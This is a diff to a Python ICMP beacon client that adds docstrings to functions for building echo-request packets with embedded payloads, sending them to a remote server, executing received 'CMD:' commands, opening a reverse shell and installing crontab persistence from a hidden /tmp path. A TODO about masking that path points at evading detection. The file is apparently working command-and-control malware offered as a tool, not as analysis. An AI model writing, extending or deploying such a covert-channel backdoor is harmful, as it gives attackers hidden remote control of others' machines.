@@ -12,6 +12,7 @@ CLIENT_ID = random.randint(1000, 9999)  # Unique ID per session
 PERSISTENT_PATH = "/tmp/.hidden_icmp_client" # TODO: change this so its masked, then use this for persistence
 
 def checksum(data):
+    """Calculate ICMP checksum for packet validity"""
     if len(data) % 2:
         data += b"\x00"
     checksum = 0
@@ -22,6 +23,7 @@ def checksum(data):
     return ~checksum & 0xFFFF
 
 def create_icmp_packet(seq, payload):
+    """Create an ICMP Echo Request packet with embedded payload data"""
     icmp_type = 8  # Echo Request
     icmp_code = 0
     identifier = CLIENT_ID
@@ -34,6 +36,7 @@ def create_icmp_packet(seq, payload):
     return header + data
 
 def send_ping(sock, seq, message):
+    """Send ICMP packet to server with embedded message"""
     packet = create_icmp_packet(seq, message)
     sock.sendto(packet, (SERVER_IP, 1))
 
@@ -58,7 +61,7 @@ def reverse_shell():
     )
 
 def execute_command(command):
-    """Executes command safely, stripping unwanted text."""
+    """Executes command, stripping unwanted text. Singular commands have the prefix of `CMD:`"""
     try:
         if command.startswith("CMD:"):
             command = command[4:]  # Strip "CMD:" prefix
@@ -96,6 +99,7 @@ def setup_persistence():
     os.system(f"crontab {cron_file} && rm {cron_file}")
 
 def main():
+    """Main beacon functionality. Calls the methods above and loops through to send a ping and wait for a response."""
     setup_persistence()
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     sock.settimeout(3)
